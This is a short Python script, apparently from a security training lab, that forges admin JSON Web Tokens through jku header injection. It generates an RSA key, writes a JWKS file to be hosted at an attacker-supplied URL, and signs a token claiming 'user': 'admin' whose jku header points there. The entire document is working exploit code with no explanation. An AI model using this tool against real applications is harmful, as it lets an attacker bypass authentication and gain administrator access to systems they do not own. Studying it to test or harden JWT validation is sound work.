from jwcrypto import jwk, jwt
import json
from sys import argv


def main(url):
    gen_key = jwk.JWK.generate(kty='RSA', size=2048)
    public = json.loads(gen_key.export_public())
    public['use'] = "sig"
    public['kid'] = "we45"
    public['alg'] = "RS256"
    full_key = {"keys": [public]}
    with open('jwks.json', 'w') as keyfile:
        keyfile.write(json.dumps(full_key))
    print("[ + ] Written to jwks.json")

    newtoken = jwt.JWT(header={"alg": "RS256", "jku": "{}/jwks.json".format(url)}, claims={"user": "admin"})
    newtoken.make_signed_token(gen_key)
    print("Generated token:", newtoken.serialize())


if __name__ == "__main__":
    if len(argv) < 2:
        print("[ ! ] You need to add a domain to generate JWK")
    else:
        url = argv[1]
        main(url)
